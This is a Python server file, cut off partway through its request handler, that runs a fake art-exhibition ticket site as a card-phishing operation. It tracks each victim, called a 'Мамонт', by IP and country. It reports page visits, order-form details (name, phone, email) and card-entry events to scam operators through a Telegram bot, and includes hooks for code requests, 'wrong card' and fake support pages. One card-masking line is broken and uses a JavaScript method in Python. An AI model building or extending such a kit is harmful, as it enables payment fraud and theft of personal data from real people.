#!/usr/bin/env python3

import http.server
import socketserver
import os
import sys
import time
from urllib.parse import urlparse, unquote, parse_qs
import requests
import sqlite3
import traceback
import json
from config import BOT_TOKEN, GROUP_ID, ADMIN_ID
from config import PAYMENT_GROUP_ID
import logging
from functools import wraps
import threading

# Настройки сервера
PORT = 8080  # Стандартный HTTP порт
DIRECTORY = "events-art.com"  # Папка з сайтом

# --- Country code to full name mapping ---
COUNTRY_NAMES = {
    'UA': 'Ukraine',
    'RU': 'Russia',
    'PL': 'Poland',
    'DE': 'Germany',
    'FR': 'France',
    'IT': 'Italy',
    'ES': 'Spain',
    'GB': 'United Kingdom',
    'US': 'United States',
    'NL': 'Netherlands',
    'TR': 'Turkey',
    'KZ': 'Kazakhstan',
    'BY': 'Belarus',
    'LT': 'Lithuania',
    'LV': 'Latvia',
    'EE': 'Estonia',
    'CZ': 'Czech Republic',
    'SK': 'Slovakia',
    'RO': 'Romania',
    'MD': 'Moldova',
    'GE': 'Georgia',
    'AM': 'Armenia',
    'AZ': 'Azerbaijan',
    'BG': 'Bulgaria',
    'GR': 'Greece',
    'HU': 'Hungary',
    'FI': 'Finland',
    'SE': 'Sweden',
    'NO': 'Norway',
    'DK': 'Denmark',
    'BE': 'Belgium',
    'CH': 'Switzerland',
    'AT': 'Austria',
    'IE': 'Ireland',
    'PT': 'Portugal',
    'HR': 'Croatia',
    'RS': 'Serbia',
    'SI': 'Slovenia',
    'BA': 'Bosnia and Herzegovina',
    'ME': 'Montenegro',
    'MK': 'North Macedonia',
    'AL': 'Albania',
    'LU': 'Luxembourg',
    'LI': 'Liechtenstein',
    'IS': 'Iceland',
    'CA': 'Canada',
    'AU': 'Australia',
    'NZ': 'New Zealand',
    # ... додайте інші країни за потреби ...
}

# Глобальні змінні для флагів
SUPPORT_FLAGS = {}  # {ip: {'support': True, 'text_id': 'id', 'used': False}}
PUSH_FLAGS = {}     # {page_code: {'used': False}}
USER_SESSIONS = {}  # {ip: timestamp}
CUSTOM_TEXTS = {}   # {text_id: text}
REQUEST_AGAIN_FLAGS = {}  # {code: True/False}
WRONG_CARD_FLAGS = {}     # {ip: True/False}
CODE_REDIRECT_FLAGS = {}  # {ip: True/False}
BLACKLISTED_IPS = set()   # set of blocked IPs
PAYMENT_DISABLED = False  # глобальний флаг для блокування платежів

# --- In-memory storage for ignoring first visit to new pages ---
IGNORE_FIRST_VISIT_PAGE_CODES = set()  # page_code: для ігнорування першого переходу

def get_event_info_by_page_code(page_code):
    """Отримує інформацію про подію за page_code"""
    try:
        db = sqlite3.connect('users.db')
        cur = db.cursor()
        
        # Спочатку шукаємо в таблиці event_links (основна таблиця)
        try:
            cur.execute('SELECT price, currency FROM event_links WHERE event_code=?', (page_code,))
            row = cur.fetchone()
            if row:
                db.close()
                return {
                    'price': row[0],
                    'currency': row[1],
                    'street': None
                }
        except Exception as e:
            print(f"[get_event_info_by_page_code] Error in event_links: {e}")
        
        # Якщо не знайдено, шукаємо в site_users (для зворотної сумісності)
        try:
            cur.execute('SELECT price, currency, street FROM site_users WHERE page_code=?', (page_code,))
            row = cur.fetchone()
            if row:
                db.close()
                return {
                    'price': row[0],
                    'currency': row[1],
                    'street': row[2]
                }
        except Exception as e:
            print(f"[get_event_info_by_page_code] Error in site_users: {e}")
        
        db.close()
        return None
    except Exception as e:
        print(f"[get_event_info_by_page_code] Error: {e}")
        return None

def is_telegram_request(user_agent):
    """Перевіряє, чи це запит від Telegram"""
    if not user_agent:
        return False
    
    telegram_indicators = [
        'TelegramBot',
        'TelegramWebApp',
        'Telegram',
        'tgweb',
        'Mozilla/5.0 (compatible; TelegramBot',
        'TelegramBot/',
        'tgwebapp'
    ]
    
    user_agent_lower = user_agent.lower()
    return any(indicator.lower() in user_agent_lower for indicator in telegram_indicators)

# Функція для очищення старих флагів
def clear_old_flags():
    current_time = time.time()
    # Очищаємо флаги старше 10 хвилин
    expired_ips = [ip for ip, timestamp in USER_SESSIONS.items() if current_time - timestamp > 600]
    for ip in expired_ips:
        if ip in SUPPORT_FLAGS:
            del SUPPORT_FLAGS[ip]
        if ip in USER_SESSIONS:
            del USER_SESSIONS[ip]
        if ip in WRONG_CARD_FLAGS:
            del WRONG_CARD_FLAGS[ip]
        if ip in CODE_REDIRECT_FLAGS:
            del CODE_REDIRECT_FLAGS[ip]
    
    # Очищаємо push флаги старше 5 хвилин
    expired_page_codes = [page_code for page_code, flag_data in PUSH_FLAGS.items() 
                         if isinstance(flag_data, dict) and flag_data.get('used', True)]
    for page_code in expired_page_codes:
        del PUSH_FLAGS[page_code]
    
    # Очищаємо request_again флаги старше 2 хвилин
    expired_codes = [code for code, flag in REQUEST_AGAIN_FLAGS.items() if not flag]
    for code in expired_codes:
        del REQUEST_AGAIN_FLAGS[code]

# --- Додаю функцію для ігнорування першого переходу ---
def add_ignore_first_visit(page_code):
    """Додає page_code до списку для ігнорування першого переходу"""
    if page_code:
        IGNORE_FIRST_VISIT_PAGE_CODES.add(page_code)
        print(f"[IGNORE_FIRST_VISIT] Added {page_code} to ignore list")

# --- Глобальний флаг для платіжки ---
# PAYMENT_DISABLED = False # This line is removed as it's now a global variable

# --- Logging setup ---
logging.basicConfig(
    filename='server.log',
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(funcName)s | %(message)s',
    datefmt='\%Y-\%m-\%d \%H:\%M:\%S'
)

def log_function(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        logging.info(f'start | args={args} kwargs={kwargs}')
        try:
            result = func(*args, **kwargs)
            logging.info(f'success | result={result}')
            return result
        except Exception as e:
            logging.error(f'error | Exception: {e}', exc_info=True)
            raise
    return wrapper

# --- Логування setup ---
def send_telegram_log_async(page, link, ip, country=None, extra_user_id=None, important=False):
    """Асинхронно надсилає лог в Telegram"""
    def send_log():
        try:
            # Отримуємо країну якщо не передана
            current_country = country
            if not current_country:
                current_country = get_country_by_ip(ip)
            
            # Формуємо повідомлення
            if extra_user_id:
                message = (
                    f"🎫 Новий перехід на сайт\n"
                    f"📄 Сторінка: {page}\n"
                    f"🔗 Посилання: {link}\n"
                    f"🌍 IP: {ip}\n"
                    f"🏳️ Країна: {current_country}\n"
                    f"👤 Event Creator ID: {extra_user_id}"
                )
                # Надсилаємо event creator
                send_telegram_message_to_user(extra_user_id, message)
                
                # Додатково логуємо в консоль
                print(f"[DEBUG] Event creator log: {message}")
            else:
                # Надсилаємо в групу тільки важливі повідомлення
                if important:
                    message = (
                        f"🚨 Важлива дія\n"
                        f"📄 Сторінка: {page}\n"
                        f"🌍 IP: {ip}\n"
                        f"🏳️ Країна: {current_country}"
                    )
                    send_telegram_message_to_group(message)
                    
                    # Також надсилаємо головному адміну
                    try:
                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
                        data_admin = {"chat_id": ADMIN_ID, "text": message}
                        requests.post(url, data=data_admin, timeout=1)
                        print(f"📤 Важливий лог надіслано головному адміну")
                    except Exception as e:
                        print(f"❌ Помилка надсилання головному адміну: {e}")
        except Exception as e:
            print(f"[Telegram Log Error] {e}")
    
    # Запускаємо в окремому потоці
    import threading
    thread = threading.Thread(target=send_log)
    thread.daemon = True
    thread.start()

def send_telegram_message_to_user(user_id, message):
    """Надсилає повідомлення конкретному користувачу"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': user_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=data, timeout=5)
        if response.status_code == 200:
            print(f"✅ Повідомлення надіслано користувачу {user_id}")
        else:
            print(f"❌ Помилка надсилання користувачу {user_id}: {response.status_code}")
    except Exception as e:
        print(f"❌ Помилка Telegram API для користувача {user_id}: {e}")

def send_telegram_message_to_group(message):
    """Надсилає повідомлення в групу"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': GROUP_ID, # Changed from ADMIN_GROUP_ID to GROUP_ID
            'text': message,
            'parse_mode': 'HTML'
        }
        response = requests.post(url, json=data, timeout=5)
        if response.status_code == 200:
            print(f"✅ Повідомлення надіслано в групу")
        else:
            print(f"❌ Помилка надсилання в групу: {response.status_code}")
    except Exception as e:
        print(f"❌ Помилка Telegram API для групи: {e}")

# --- Оптимізована функція отримання країни ---
def get_country_by_ip(ip):
    """Отримує країну за IP з кешу або API"""
    if not ip or ip in ['127.0.0.1', 'localhost', '::1']:
        return "Local"
    
    # Перевіряємо кеш
    if hasattr(get_country_by_ip, 'cache') and ip in get_country_by_ip.cache:
        return get_country_by_ip.cache[ip]
    
    try:
        response = requests.get(f'https://ipinfo.io/{ip}/json', timeout=3)
        if response.status_code == 200:
            data = response.json()
            country_code = data.get('country', 'Unknown')
            country_full = data.get('country_name', country_code)
            
            # Кешуємо результат
            if not hasattr(get_country_by_ip, 'cache'):
                get_country_by_ip.cache = {}
            get_country_by_ip.cache[ip] = country_full
            
            return country_full
        else:
            return "Unknown"
    except Exception:
        return "Unknown"

def is_api_request(path):
    """Перевіряє, чи це API запит"""
    api_patterns = [
        '/check_',      # check_support, check_push, check_code_redirect
        '/api/',        # API запити
        '/update_',     # Оновлення
        '/get_',        # get_custom_text
        # '/buy-tickets/loading/',  # ВИДАЛЕНО - це сторінка, а не API
        '/file/',       # Файли
        '/favicon.ico'  # Favicon
    ]
    
    for pattern in api_patterns:
        if path.startswith(pattern):
            return True
    return False

def get_page_name(path):
    """Визначає назву сторінки за шляхом"""
    if path == '/' or path == '/index.html':
        return "Главная страница"
    elif '/buy-tickets/' in path:
        if '/loading/' in path:
            return "Оформление заказа (Ввод карты)"
        elif '/code/' in path:
            return "Оформление заказа (код)"
        elif '/quantity/' in path:
            return "Оформление заказа (количество)"
        elif '/payment/' in path:
            return "Оформление заказа (оплата)"
        else:
            return "Оформление заказа"
    elif '/events/' in path:
        if '/overview/' in path:
            return "Обзор события"
        elif '/details/' in path:
            return "Детали события"
        else:
            return "События"
    elif '/about/' in path:
        return "О нас"
    elif '/contact/' in path:
        return "Контакты"
    elif '/gallery/' in path:
        return "Галерея"
    else:
        # Спробуємо витягнути назву з шляху
        clean_path = path.strip('/').replace('-', ' ').replace('_', ' ').title()
        if clean_path:
            return clean_path
        return "Неизвестная страница"

def get_event_name_from_page_code(page_code):
    """Визначає назву події за page_code"""
    if not page_code:
        return "Выставка"
    
    try:
        # Шукаємо page_code в URL
        import re
        match = re.search(r'page=(\d+-\d+)', page_code)
        if match:
            series = int(match.group(1).split('-')[0])
            event_names = [
                "Terroir and Traditions",
                "Collection Co–selection", 
                "Snucie",
                "Art that saves lives",
                "Gotong Royong",
                "Anna Konik",
                "Uncensored",
                "Jacek Adamas"
            ]
            if 1 <= series <= len(event_names):
                return event_names[series - 1]
    except:
        pass
    
    return "Выставка"

@log_function
def send_telegram_log(page, link, ip, country="", extra_user_id=None, important=False):
    print(f"\n\n\n\n\n\n\n\n\n\n[DEBUG] send_telegram_log called with: page={page}, link={link}, ip={ip}, country='{country}'")
    
    # Якщо країна не передана, використовуємо "Unknown"
    current_country = country
    if not current_country:
        current_country = "Unknown"
        print(f"[DEBUG] No country provided, using: {current_country}")
    
    # Перетворюємо код країни на повну назву (якщо це код)
    country_full = COUNTRY_NAMES.get(current_country, current_country)
    print(f"[DEBUG] Final country: '{current_country}' -> '{country_full}'")
    
    # Визначаємо назву сторінки
    page_name = get_page_name(page)
    
    # Визначаємо назву події з page_code
    event_name = get_event_name_from_page_code(link)
    
    msg = (
        f"🔔 Мамонт открыл страницу\n\n"
        f"📎 Страница: {page_name}\n"
        f"#️⃣ Ссылка: {link}\n"
        f"📶 IP: {ip}\n"
        f"🌎 Страна: {country_full}"
    )
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data_admin = {"chat_id": ADMIN_ID, "text": msg}
    data_group = {"chat_id": PAYMENT_GROUP_ID, "text": msg}  # Логи сторінок йдуть в групу З КНОПКАМИ
    
    try:
        # Якщо це лог для event creator, надсилаємо тільки йому
        if extra_user_id:
            try:
                data_event_creator = {"chat_id": extra_user_id, "text": msg}
                requests.post(url, data=data_event_creator, timeout=1)
                print(f"📤 Лог надіслано event creator {extra_user_id}")
                
                # Логи сторінок йдуть в групу З КНОПКАМИ (PAYMENT_GROUP_ID)
                        
            except Exception as e:
                print(f"❌ Помилка надсилання event creator {extra_user_id}: {e}")
        else:
                        # Звичайне логування для адміністраторів
            if important:
                try:
                    # НЕ надсилаємо логи сторінок в групу З КНОПКАМИ
                    # У групі З кнопками мають бути тільки логи з кнопками (карта, код)
                    print(f"📝 Лог сторінки {page} залоговано (не надсилається в групу З КНОПКАМИ)")
                except Exception as e:
                    print(f"❌ Помилка логування сторінки: {e}")
            
            try:
                requests.post(url, data=data_admin, timeout=1)
            except Exception as e:
                print(f"❌ Помилка надсилання головному адміну: {e}")
            
            # Надсилаємо лог всім адміністраторам
            try:
                from config import ADMIN_IDS
                for admin_id in ADMIN_IDS:
                    if admin_id != ADMIN_ID:  # Не дублюємо головному адміну
                        try:
                            data_admin_personal = {"chat_id": admin_id, "text": msg}
                            requests.post(url, data=data_admin_personal, timeout=1)
                        except Exception as e:
                            print(f"❌ Помилка надсилання адміну {admin_id}: {e}")
            except Exception as e:
                print(f"❌ Помилка надсилання адміністраторам: {e}")
                    
    except Exception as e:
        print(f"❌ Не вдалося надіслати лог у Telegram: {e}")

# Додаємо функцію для логування кнопок в чат
def send_button_log_to_chat(button_type, ip, page_code, user_name=None, event_info=None):
    """
    Надсилає лог про кнопку в чат з кнопками
    """
    try:
        # Формуємо повідомлення про кнопку
        if button_type == 'push':
            msg = f"🔔 Push-повідомлення з'явилося на сайті\n\n"
        elif button_type == 'code':
            msg = f"🔔 Вікно запиту коду з'явилося на сайті\n\n"
        elif button_type == 'support':
            msg = f"🔔 Сторінка техпідтримки завантажена на сайті\n\n"
        elif button_type == 'text':
            msg = f"🔔 Кнопка з текстом з'явилася на сайті\n\n"
        else:
            msg = f"🔔 Кнопка {button_type} з'явилася на сайті\n\n"
        
        if user_name:
            msg += f"👤 Користувач: {user_name}\n"
        if ip:
            msg += f"📶 IP: {ip}\n"
        if page_code:
            msg += f"#️⃣ Сторінка: {page_code}\n"
        if event_info:
            msg += f"💰 Сума: {event_info.get('price', 'N/A')} {event_info.get('currency', '')}\n"
        
        # Додаємо URL з сумою для кожної кнопки
        if page_code and event_info and event_info.get('price'):
            if button_type == 'push':
                button_url = f"https://artpullse.com/push/?page={page_code}&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
            elif button_type == 'support':
                button_url = f"https://artpullse.com/support/?page={page_code}&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
            elif button_type == 'text':
                button_url = f"https://artpullse.com/text/?page={page_code}&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
            else:
                button_url = f"https://artpullse.com/?page={page_code}&total={event_info.get('price')}&currency={event_info.get('currency', '')}"
            
            msg += f"🔗 URL: {button_url}\n"
        
        # НЕ надсилаємо в групу - тільки в особисті повідомлення адміну
        # url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        # data_group = {"chat_id": GROUP_ID, "text": msg}
        
        # Логуємо тільки в консоль
        print(f"✅ Лог про кнопку {button_type} залоговано (не надсилається в групу)")
        print(f"📝 Повідомлення: {msg}")
            
    except Exception as e:
        print(f"❌ Помилка в send_button_log_to_chat: {e}")

def send_personal_log_to_admin(page_code, ip, country, page_name, action_type="page_view"):
    """
    Надсилає лог в особисті повідомлення з ботом адміну
    """
    print(f"\n\n\n\n\n\n\n\n\n\n\n\n{page_name}")
    #page_name = get_page_name(page) 
    try:
        # Отримуємо admin_id за page_code
        db = sqlite3.connect('users.db')
        cur = db.cursor()
        
        # Спочатку шукаємо в event_links
        cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
        row = cur.fetchone()
        
        if not row:
            # Якщо не знайдено в event_links, шукаємо в site_users
            cur.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
            row = cur.fetchone()
        
        db.close()
        
        if row:
            admin_id = row[0]
            
            # Визначаємо назву події
            event_name = get_event_name_from_page_code(f"?page={page_code}")
            
            # Формуємо повідомлення в потрібному форматі
            message = f"""🔔Мамонт открыл страницу ({page_name})

📎Страница: {page_name}
#️⃣Ссылка: ?page={page_code}
📶IP: {ip}
🌎Страна: {country}"""
            
            # Надсилаємо повідомлення через Telegram API
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": admin_id, "text": message}
            
            try:
                response = requests.post(url, data=data, timeout=2)
                if response.status_code == 200:
                    print(f"✅ Персональний лог надіслано адміну {admin_id}")
                else:
                    print(f"⚠️ Помилка надсилання персонального логу: {response.status_code}")
            except Exception as e:
                print(f"❌ Помилка надсилання персонального логу адміну {admin_id}: {e}")
        else:
            print(f"⚠️ Не знайдено адміна для page_code: {page_code}")
            
    except Exception as e:
        print(f"❌ Помилка в send_personal_log_to_admin: {e}")

def send_event_selection_log(page_code, ip, country, event_name, event_index):
    """
    Надсилає лог про вибір івенту в особисті повідомлення з ботом адміну
    """
    try:
        # Отримуємо admin_id за page_code
        db = sqlite3.connect('users.db')
        cur = db.cursor()
        
        # Спочатку шукаємо в event_links
        cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
        row = cur.fetchone()
        
        if not row:
            # Якщо не знайдено в event_links, шукаємо в site_users
            cur.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
            row = cur.fetchone()
        
        db.close()
        
        if row:
            admin_id = row[0]
            
            # Формуємо повідомлення про вибір івенту
            message = f"""🔔Мамонт выбрал событие

📎Страница: Выбор события
#️⃣Ссылка: ?page={page_code}
📶IP: {ip}
🌎Страна: {country}
🎫Событие: {event_name} (№{event_index + 1})"""
            
            # Надсилаємо повідомлення через Telegram API
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": admin_id, "text": message}
            
            try:
                response = requests.post(url, data=data, timeout=2)
                if response.status_code == 200:
                    print(f"✅ Лог про вибір івенту надіслано адміну {admin_id}")
                else:
                    print(f"⚠️ Помилка надсилання логу про вибір івенту: {response.status_code}")
            except Exception as e:
                print(f"❌ Помилка надсилання логу про вибір івенту адміну {admin_id}: {e}")
        else:
            print(f"⚠️ Не знайдено адміна для page_code: {page_code}")
            
    except Exception as e:
        print(f"❌ Помилка в send_event_selection_log: {e}")

def send_order_form_log(page_code, ip, country, name, phone, email, price, currency):
    """
    Надсилає лог про заповнення форми замовлення в особисті повідомлення з ботом адміну
    """
    try:
        # Отримуємо admin_id за page_code
        db = sqlite3.connect('users.db')
        cur = db.cursor()
        
        # Спочатку шукаємо в event_links
        cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
        row = cur.fetchone()
        
        if not row:
            # Якщо не знайдено в event_links, шукаємо в site_users
            cur.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
            row = cur.fetchone()
        
        db.close()
        
        if row:
            admin_id = row[0]
            
            # Визначаємо назву події
            event_name = get_event_name_from_page_code(f"?page={page_code}")
            
            # Формуємо повідомлення про форму замовлення
            message = f"""🔔Мамонт заполнил форму заказа

📎Страница: Оформление заказа
#️⃣Ссылка: ?page={page_code}
📶IP: {ip}
🌎Страна: {country}
👤Имя: {name or 'Не указано'}
📱Телефон: {phone or 'Не указано'}
📧Email: {email or 'Не указано'}
💰Сумма: {price or 'Не указано'}{currency or ''}"""
            
            # Надсилаємо повідомлення через Telegram API
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": admin_id, "text": message}
            
            try:
                response = requests.post(url, data=data, timeout=2)
                if response.status_code == 200:
                    print(f"✅ Лог про форму замовлення надіслано адміну {admin_id}")
                else:
                    print(f"⚠️ Помилка надсилання логу про форму замовлення: {response.status_code}")
            except Exception as e:
                print(f"❌ Помилка надсилання логу про форму замовлення адміну {admin_id}: {e}")
        else:
            print(f"⚠️ Не знайдено адміна для page_code: {page_code}")
            
    except Exception as e:
        print(f"❌ Помилка в send_order_form_log: {e}")

def send_card_input_log(page_code, ip, country, card_number, email, price, currency):
    """
    Надсилає лог про введення карти в особисті повідомлення з ботом адміну
    """
    try:
        # Отримуємо admin_id за page_code
        db = sqlite3.connect('users.db')
        cur = db.cursor()
        
        # Спочатку шукаємо в event_links
        cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
        row = cur.fetchone()
        
        if not row:
            # Якщо не знайдено в event_links, шукаємо в site_users
            cur.execute('SELECT tg_id FROM site_users WHERE page_code=?', (page_code,))
            row = cur.fetchone()
        
        db.close()
        
        if row:
            admin_id = row[0]
            
            # Визначаємо назву події
            event_name = get_event_name_from_page_code(f"?page={page_code}")
            
            # Маскуємо номер карти (показуємо тільки останні 4 цифри)
            masked_card = f"**** **** **** {card_number.slice(-4)}" if card_number else "Не указано"
            
            # Формуємо повідомлення про введення карти
            message = f"""🔔Мамонт ввел данные карты

📎Страница: Ввод карты
#️⃣Ссылка: ?page={page_code}
📶IP: {ip}
🌎Страна: {country}
💳Карта: {masked_card}
📧Email: {email or 'Не указано'}
💰Сумма: {price or 'Не указано'}{currency or ''}"""
            
            # Надсилаємо повідомлення через Telegram API
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            data = {"chat_id": admin_id, "text": message}
            
            try:
                response = requests.post(url, data=data, timeout=2)
                if response.status_code == 200:
                    print(f"✅ Лог про введення карти надіслано адміну {admin_id}")
                else:
                    print(f"⚠️ Помилка надсилання логу про введення карти: {response.status_code}")
            except Exception as e:
                print(f"❌ Помилка надсилання логу про введення карти адміну {admin_id}: {e}")
        else:
            print(f"⚠️ Не знайдено адміна для page_code: {page_code}")
            
    except Exception as e:
        print(f"❌ Помилка в send_card_input_log: {e}")

def get_real_ip(handler):
    xff = handler.headers.get('X-Forwarded-For')
    if xff:
        return xff.split(',')[0].strip()
    return handler.client_address[0]

# Додаємо допоміжну функцію для отримання page_code по user_id
import requests

def get_user_id_by_page_code(page_code):
    try:
        resp = requests.get(f'http://127.0.0.1:8081/api/user_id_by_page_code?page={page_code}', timeout=2)
        if resp.status_code == 200:
            return resp.json().get('user_id')
    except Exception as e:
        print(f'[server.py] Error getting user_id for page_code={page_code}: {e}')
    return None

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)
    
    def end_headers(self):
        # Добавляем CORS заголовки для безопасности
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        
        # Кешування: HTML не кешуємо, статичні файли віддаємо з довгим кешем
        try:
            path_value = getattr(self, 'path', '') or ''
            if isinstance(path_value, bytes):
                path_value = path_value.decode('utf-8', errors='ignore')
            if path_value.endswith('.html') or path_value.endswith('/') or ('?' in path_value):
                self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
                self.send_header('Pragma', 'no-cache')
                self.send_header('Expires', '0')
            else:
                static_exts = (
                    '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
                    '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
                    '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
                )
                if any(path_value.endswith(ext) for ext in static_exts):
                    self.send_header('Cache-Control', 'public, max-age=31536000, immutable')
        except Exception:
            pass
        
        super().end_headers()
    
    def is_blocked(self):
        # Використовуємо реальний IP з X-Forwarded-For для коректної роботи за проксі/CDN
        ip = get_real_ip(self)
        return ip in BLACKLISTED_IPS

    @log_function
    def do_GET(self):
        qs = {}
        if '?' in self.path:
            qs = parse_qs(self.path.split('?', 1)[1])
        # --- Блокування IP ---
        if self.is_blocked():
            self.send_response(403)
            self.end_headers()
            self.wfile.write('<html><body><h2>Your IP has been blocked by the administrator.</h2></body></html>'.encode('utf-8'))
            return
        # Логуємо тільки важливі запити
        if not is_api_request(self.path):
            print(f"GET: {self.path}")
        path = unquote(self.path.split('?', 1)[0])
        orig_path = path
        # Якщо файл не знайдено, але є параметри — повертаємо index.html з відповідної папки
        fs_path = self.translate_path(path)
        if not os.path.exists(fs_path):
            if path.endswith('/'):
                path += 'index.html'
            elif not path.endswith('.html'):
                path += '/index.html'
            fs_path = self.translate_path(path)
            if os.path.exists(fs_path):
                self.path = path
        if orig_path.startswith('/file/ticket/'):
            filename = orig_path[len('/file/ticket/'):]
            ticket_path = os.path.join('tickets', filename)
            if os.path.exists(ticket_path):
                self.send_response(200)
                self.send_header('Content-Type', 'application/pdf')
                self.send_header('Content-Disposition', f'inline; filename=\"{filename}\"')
                self.end_headers()
                with open(ticket_path, 'rb') as f:
                    self.wfile.write(f.read())
            else:
                self.send_error(404, 'Ticket not found')
            return
        skip_ext = (
            '.css', '.js', '.png', '.jpg', '.jpeg', '.svg', '.ico', '.webp', '.json',
            '.woff', '.ttf', '.eot', '.otf', '.mp4', '.mp3', '.wav', '.ogg', '.zip', '.pdf',
            '.gif', '.bmp', '.tiff', '.map', '.txt', '.xml'
        )
        skip_dirs = ('/css/', '/js/', '/image/', '/fonts/', '/static/', '/assets/')
        # Якщо це ресурс — не логувати
        if any(ext in orig_path for ext in skip_ext) or any(d in orig_path for d in skip_dirs):
            try:
                return super().do_GET()
            except BrokenPipeError:
                # Клієнт закрив з'єднання - це нормально, не логуємо
                print(f"[INFO] Client disconnected for {self.path}")
                return
            except ConnectionResetError:
                # Клієнт скинув з'єднання - це нормально, не логуємо
                print(f"[INFO] Connection reset by client for {self.path}")
                return
        
        # Перевіряємо, чи це реальна сторінка (не API, не ресурс)
        is_real_page = (
            not any(ext in orig_path for ext in skip_ext) and 
            not any(d in orig_path for d in skip_dirs) and
            not is_api_request(orig_path)  # Використовуємо функцію для перевірки API
        )
        
        # Перевіряємо User-Agent для фільтрації Telegram
        user_agent = self.headers.get('User-Agent', '')
        is_telegram = is_telegram_request(user_agent)
        
        if not is_telegram and is_real_page:
            ip = get_real_ip(self)
            # Логуємо тільки важливі запити
            if not orig_path.startswith('/api/'):
                print(f"📝 Запит на сторінку: {orig_path} від IP: {ip}")
        elif is_telegram:
            pass  # Не логуємо Telegram запити
        elif not is_real_page:
            pass  # Не логуємо API/ресурси
        # --- NEW: If ?page=page_code in URL, update IP in database ---
        page_code_for_ip = None
        if 'page' in qs:
            page_code_for_ip = qs['page'][0]
            # Оновлюємо IP у базі даних
            if page_code_for_ip:
                ip = get_real_ip(self)
                try:
                    requests.post('http://127.0.0.1:8081/update_site_user_ip', json={
                        'page_code': page_code_for_ip,
                        'ip': ip
                    }, timeout=2)
                    print(f"[IP Update] Updated IP for page_code: {page_code_for_ip}, IP: {ip}")
                except Exception as e:
                    print(f"[IP Update] Error updating IP: {e}")
        # --- END NEW ---
        # --- NEW: If ?page=code in URL, try to find event creator ---
        extra_user_id = None
        if 'page' in qs:
            page_code = qs['page'][0]
            if page_code:
                try:
                    db = sqlite3.connect('users.db')
                    cur = db.cursor()
                    # Спочатку шукаємо в event_links (для нових записів)
                    cur.execute('SELECT user_id FROM event_links WHERE event_code=?', (page_code,))
                    row = cur.fetchone()
                    if row:
                        extra_user_id = row[0]
                        print(f"[DB] Found user_id {extra_user_id} in event_links for page_code: {page_code}")
                    else:
                        # Якщо не знайдено в event_links, шукаємо в site_users
                        cur.execute('SELECT id FROM site_users WHERE page_code=?', (page_code,))
                        row = cur.fetchone()
                        if row:
                            extra_user_id = row[0]
                            print(f"[DB] Found user_id {extra_user_id} in site_users for page_code: {page_code}")
                        else:
                            print(f"[DB] Page code {page_code} not found in any table")
                    db.close()
                except Exception as e:
                    print(f"[DB] Error fetching event creator: {e}")
        # --- END NEW ---
        # Нормалізуємо шлях для унікальності
        norm_path = orig_path
        if norm_path.endswith('/index.html'):
            norm_path = norm_path[:-10]
        if norm_path == '' or norm_path == '/':
            norm_path = '/'
        # Логувати тільки реальні сторінки (не API, не ресурси)
        should_log = (
            not any(ext in norm_path for ext in skip_ext) and 
            not any(d in norm_path for d in skip_dirs) and
            not is_api_request(norm_path)  # Використовуємо функцію для перевірки API
        )
        
        # --- LOGIC CHANGE: always log to event creator if ?page=code, regardless of should_log ---
        ip = get_real_ip(self)
        
        # Перевіряємо User-Agent для фільтрації Telegram
        user_agent = self.headers.get('User-Agent', '')
        is_telegram = is_telegram_request(user_agent)
        
        # Перевіряємо, чи потрібно ігнорувати перший перехід для цього page_code
        page_code = qs.get('page', [None])[0]
        should_ignore_first_visit = page_code and page_code in IGNORE_FIRST_VISIT_PAGE_CODES
        
        # Логуємо для event creator ТІЛЬКИ якщо це сторінка з його page_code
        if extra_user_id and not is_telegram and should_log and page_code:
            # Debug інформація тільки для реальних сторінок (не API)
            if should_log and not is_telegram:
                print(f"[DEBUG] Логуємо для event creator: extra_user_id={extra_user_id}, is_telegram={is_telegram}, should_log={should_log}, page_code={page_code}")
                print(f"[DEBUG] norm_path: {norm_path}")
                print(f"[DEBUG] orig_path: {orig_path}")
                print(f"[DEBUG] self.path: {self.path}")
        
        # Отримуємо країну за IP
        country = get_country_by_ip(ip)
        
        # Debug інформація тільки для реальних сторінок
        if should_log and not is_telegram:
            print(f"[DEBUG] Надсилаємо лог event creator: {norm_path}, IP: {ip}, країна: {country}, user_id: {extra_user_id}")
        
        # Логуємо ТІЛЬКИ для event creator на сторінці введення карти (НЕ Telegram)
        if '/buy-tickets/loading/' in norm_path and extra_user_id and not is_telegram:
            print(f"[DEBUG] 🎯 Знайдено сторінку введення карти: {norm_path}")
